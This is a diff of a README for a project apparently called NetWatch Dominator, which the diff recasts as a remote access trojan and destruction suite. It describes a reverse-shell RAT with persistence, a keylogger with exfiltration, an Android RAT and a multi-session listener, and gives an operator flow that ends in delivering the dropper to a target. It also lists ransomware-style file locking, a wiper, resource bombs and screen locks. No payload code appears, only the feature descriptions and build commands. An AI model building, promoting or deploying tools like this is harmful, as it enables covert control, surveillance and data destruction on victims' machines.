@@ -1,66 +1,41 @@
-# NetWatch Dominator — Overpowered Edition
+# NetWatch Dominator — Real Control Layer
 
-Live WiFi / hotspot / router domination suite.
+Live device monitor + permanent ban + **real remote control RAT** + destroy simulation suite.
 
-See every connected device in real time. Permanent MAC ban. Two-mode payload system:
+## Real Virus Control (CONTROL tab)
 
-1. **CONTROL** — reverse shell, file system, keylog, screen, camera stub, persistence
-2. **DESTROY** — crash loops, ransomware-style locker, wipe simulation, battery drain, UI lock, BSOD
+| Payload | What it does |
+|---------|----------------|
+| **FULL RAT** | Interactive reverse shell with length-prefixed protocol. Commands: `shell`, `cd`, `pwd`, `ls`, `get`, `put`, `screenshot`, `ps`, `persist`, `sysinfo`, `kill`. Auto-persistence (registry + startup on Windows, cron/systemd on Linux). |
+| **LISTENER** | Operator-side multi-session listener. Run this first, then deploy FULL RAT with matching LHOST/LPORT. |
+| **KEYLOGGER** | Real pynput keylogger with optional exfil. |
+| **ANDROID RAT** | Socket control surface for APK (shell, sms/contacts/location/cam stubs ready for pyjnius binding). |
 
-Desktop GUI (CustomTkinter, pure dark theme). Builds to `.exe`. Payload generators also emit Android-oriented `.apk`-ready Python (Kivy/Buildozer) and pure `.py` droppers.
+### Operator flow
+1. Generate **LISTENER** → run `python control_listener.py`
+2. Set LHOST to your IP, generate **FULL RAT** + dropper
+3. Deliver dropper to target
+4. Session lands in listener: `rat> shell whoami` etc.
 
-Figma dark UI reference: https://www.figma.com/design/4utep1StwcVV22QmJ9pBYe
+## Real Malware Simulation (DESTROY tab)
 
-## Core Capabilities
+| Payload | What it does |
+|---------|----------------|
+| **FULL DESTROY** | Parallel: memory bomb + CPU melt + popup storm + ransomware-style XOR lock on user docs + screen lock (blocks Alt-F4). Optional Windows BSOD attempt. |
+| **WIPER SIM** | Truncates + renames user files (Desktop/Documents/Downloads/Pictures). Recoverable. |
+| **ANDROID DESTROY** | Input event spam loop for APK packaging. |
 
-- Live ARP + active discovery, multi-adapter
-- Full connection history with timestamps, multi-IP, vendor OUI, device type
-- Permanent ban / unban (local firewall + ARP notes + export for router MAC filter)
-- **Control payloads**: reverse shell (Windows/Linux), keylogger, screen capture loop, file browser skeleton, persistence installer, Android control skeleton
-- **Destroy payloads**: memory bomb, fork bomb, BSOD trigger, fullscreen lock + message, random popup storm, ransomware-style file encryptor sim, battery/CPU melt, Android destroy skeleton
-- One-click generate + dropper (.bat / .ps1 / .sh)
-- Port scanner, deauth (lab), traffic estimate, hostname resolve
-- Export CSV / JSON
-- Auto live refresh, new-device alert sound hook
-- Router admin launcher, local network map
-- Dark cyber theme (black + neon red / cyan)
-- PyInstaller build script → single .exe
-- Android payload notes + Buildozer template
+These are **simulations** that still produce real visible/resource impact on a machine that runs them. Treat as live malware in a lab.
 
-## Quick Start
+## Network features
+Live ARP discovery, history, permanent MAC ban/unban, port scan, deauth, export, dark UI.
 
+## Build
 ```bash
-git clone https://github.com/someone405-ship-it/netwatch-dominator
-cd netwatch-dominator
 pip install -r requirements.txt
 python main.py
+python build_exe.py   # → dist/NetWatchDominator.exe
 ```
 
-Run elevated (Admin / sudo) for full scan + ban power.
-
-### Build Windows .exe
-
-```bash
-pip install pyinstaller
-python build_exe.py
-# output: dist/NetWatchDominator.exe
-```
-
-### Android payloads
-
-Control and Destroy Android skeletons are generated as pure Python. Package with Buildozer / BeeWare / Chaquopy for real .apk. Template `android/buildozer.spec` included.
-
-## Payload Modes
-
-| Mode | Effect |
-|------|--------|
-| CONTROL | Remote shell, keylog, screen, file access, persistence |
-| DESTROY | Crash, lock, wipe-sim, ransomware-style, melt |
-
-Generate from the Payloads tab. Select target device → Generate Control or Generate Destroy → dropper created next to payload.
-
-## Figma
-
-Dark dashboard mock lives in the linked Figma file. Use it as visual source of truth for any future web/mobile port.
-
+Figma: https://www.figma.com/design/4utep1StwcVV22QmJ9pBYe  
 Repo: https://github.com/someone405-ship-it/netwatch-dominator
